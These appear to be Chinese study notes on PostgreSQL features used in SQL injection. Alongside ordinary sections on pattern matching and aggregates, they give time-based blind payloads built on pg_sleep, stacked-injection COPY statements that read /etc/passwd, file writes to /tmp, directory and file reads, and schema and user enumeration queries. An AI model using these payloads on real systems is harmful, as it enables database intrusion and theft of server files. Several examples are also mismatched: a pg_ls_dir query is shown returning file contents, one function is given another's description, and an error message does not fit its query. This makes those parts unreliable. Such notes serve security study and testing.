**类似还有`SIMILAR TO`**

`SIMILAR TO`运算符根据其模式是否与给定的字符串匹配而返回 true 或 false。它类似于`LIKE`，除了它使用 SQL 标准的正则表达式定义来解释模式。 SQL 正则表达式是`LIKE`表示法和通用正则表达式表示法之间的一个奇怪的交叉。

像`LIKE`一样，`SIMILAR TO`运算符仅在其模式与整个字符串匹配时才成功；这与常见的正则表达式行为不同，在常规行为中，模式可以匹配字符串的任何部分。与`LIKE`一样，`SIMILAR TO`使用`_`和`%`作为通配符，分别表示任何单个字符和任何字符串(在 POSIX 正则表达式中，它们分别与`.`和`.*`相类似)。

除了从`LIKE`借用的这些功能之外，`SIMILAR TO`还支持从 POSIX 正则表达式借用的这些模式匹配元字符：

+   `|`表示交替(两种选择之一)。
+   `*`表示重复上一个项目零次或多次。
+   `+`表示重复前一个项目一次或多次。
+   `?`表示重复上一个项目零或一次。
+   `{` *`m`* `MARKDOWN_HASHcbb184dd8e05c9709e5dcaedaa0495cfMARKDOWN*HASH*`*表示前一项正好重复*`m` \*次。
+   `{` *`m`* `,}`表示重复上一项 *`m`* 或更多次。
+   `{` *`m`* `,` *`n`* `}`表示前一项重复至少 *`m`* 但不超过 *`n`* 次。
+   括号`()`可用于将项目分组为单个逻辑项目。
+   与 POSIX 正则表达式一样，方括号表达式`[...]`指定字符类。

请注意，句点(`.`)不是`SIMILAR TO`的元字符。

与`LIKE`一样，反斜杠会禁用任何这些元字符的特殊含义；或可以使用`ESCAPE`指定其他转义字符。

Some examples:

```sql
'abc' SIMILAR TO 'abc'      true
'abc' SIMILAR TO 'a'        false
'abc' SIMILAR TO '%(b|d)%'  true
'abc' SIMILAR TO '(b|c)%'   false
```

## 聚合函数

`plsql`中并没有`group_concat()`这个函数，用聚合函数`array_agg()、string_agg()`

```plsql
--array_agg(expression) 把表达式变成一个数组
postgres=# select array_agg(name) from company;
 array_agg
-----------
 {Paul,cc}
(1 row)

--通常搭配array_to_string()使用

postgres=# select array_to_string(array_agg(name),',') from company;
 array_to_string
-----------------
 Paul,cc
(1 row)
```

```plsql
--string_agg(expression, delimiter) 直接把一个表达式变成字符串
postgres=# select string_agg(name,',')  from company;
 string_agg
------------
 Paul,cc
(1 row)
```

## 延时函数

`pg_sleep(5)`

**注意：**

```plsql
--与mysql中的sleep()有所不同
--当将pg_sleep()与布尔一起使用时会报错，因为pg_sleep返回值为空。
postgres=# select '1' = pg_sleep(1);
ERROR:  argument of AND must be type boolean, not type void
LINE 1: select '1' and pg_sleep(1);
```

这里提供几种解决的办法

```plsql
方法1：
select xxx from pg_sleep(); --可以延时，并且返回xxx

postgres=# select 1 from pg_sleep(1);
 ?column?
----------
        1
(1 row)
--通过这个就有返回值，可以比较了
postgres=# select '1'=(select '1' from pg_sleep(1));
 ?column?
----------
 t
(1 row)

--可以看出plsql的数据类型比较严格，不会随意进行转换

方法2：
--通过类型转换，将数据转化为字符
postgres=# select '1'=pg_sleep(1)::varchar;
 ?column?
----------
 f
(1 row)

select * from company where id = 1 and 'a'=(case when (1=1) then pg_sleep(5)::VARCHAR else 'a' end);

方法3：
--通过||
--与mysql不一样，在plsql中，||是拼接字符串的意思

postgres=# select '1'||'asss';
 ?column?
----------
 1asss
(1 row)
select * from company where id = 1 and 'a'=(case when (1=1) then pg_sleep(5)||'b' else 'a' end);
```

## 文件操作

`pg_ls_dir()`：列出目录的内容。 默认限制为超级用户，但可以授予其他用户 EXECUTE 来运行该功能。

`pg_read_file()`：列出目录的内容。 默认限制为超级用户，但可以授予其他用户 EXECUTE 来运行该功能。

```plsql
postgres=# select pg_ls_dir('/');
 pg_ls_dir
------------
 home
 srv
 etc
 opt
 root
 lib
 mnt
 usr
 media
 lib64
 sys
 dev
 sbin
 boot
 bin
 run
 lib32
 libx32
 init
 proc
 snap
 tmp
 var
 lost+found
(24 rows)

postgres=# select pg_ls_dir('/');
                                       pg_read_file
-------------------------------------------------------------------------------------------
 root:x:0:0:root:/root:/bin/bash                                                          +
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                          +
 bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                     +
 sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                     +
 sync:x:4:65534:sync:/bin:/bin/sync                                                       +
 games:x:5:60:games:/usr/games:/usr/sbin/nologin                                          +
 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                          +
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                             +
 mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                              +
 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin                                        +
 uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                      +
 proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                               +
 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                     +
 backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                     +
 list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin                            +
 irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                         +
 gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin        +
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin                               +
 systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin   +
 systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin             +
 systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin+
 messagebus:x:103:106::/nonexistent:/usr/sbin/nologin                                     +
 syslog:x:104:110::/home/syslog:/usr/sbin/nologin                                         +
 _apt:x:105:65534::/nonexistent:/usr/sbin/nologin                                         +
 tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false                              +
 uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin                                            +
 tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin                                        +
```

**堆叠注入时**

```plsql
CREATE TABLE Y1ng(t TEXT);
COPY Y1ng FROM '/etc/passwd';
SELECT * FROM Y1ng limit 1 offset 0;  --通过偏移量读取某一行
SELECT * FROM Y1ng limit 1 offset 1;
SELECT * FROM Y1ng limit 1 offset 2;
SELECT * FROM Y1ng limit 1 offset 3;
SELECT * FROM Y1ng limit 1 offset 4;
SELECT * FROM Y1ng limit 1 offset 5;
--直接读取文件的全部内容：
CREATE TABLE Y1ng(t TEXT);
COPY Y1ng(t) FROM '/etc/passwd';
SELECT * FROM Y1ng;
```

**文件写入**

```pl
DROP TABLE Y1ng;
CREATE TABLE Y1ng (t TEXT);
INSERT INTO Y1ng(t) VALUES ('hello Y1ng');
COPY Y1ng(t) TO '/tmp/Y1ng';
```

## 系统数据库

在plsql中也存在库`information_schema`

```plsql
--查表名
select table_name from information_schema.tables where table_name not like 'pg%' and table_schema='public';
select table_name from information_schema.tables where table_name not like 'pg%';
select string_agg(tablename, ',') from pg_tables where schemaname='public';
--查列名
select column_name from information_schema.columns where table_name like 'company';
select string_agg(column_name, ',') from information_schema.columns where table_schema='public'
(老版本)
pg_class.oid对应pg_attribute.attrelid
pg_class.relname表名
pg_attribute.attname字段名

select relname from pg_class获取表名
select oid from pg_class wehre relname='admin'获取表的oid
select attname from pg_attribute where attrelid='oid的值'  获取字段名
```

## plsql常用命令

```plsql
select CURRENT_SCHEMA()           #查看当前权限
select user                       #查看用户
select current_user               #查看当前用户
select chr(97)                    #将ASCII码转为字符
select chr(97)||chr(100)||chr(109)||chr(105)||chr(110)  #将ASCII转换为字符串
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();
select version()                  #查看PostgreSQL数据库版本
SELECT current_database()         #查看当前数据库
select length('admin')            #查看长度
```
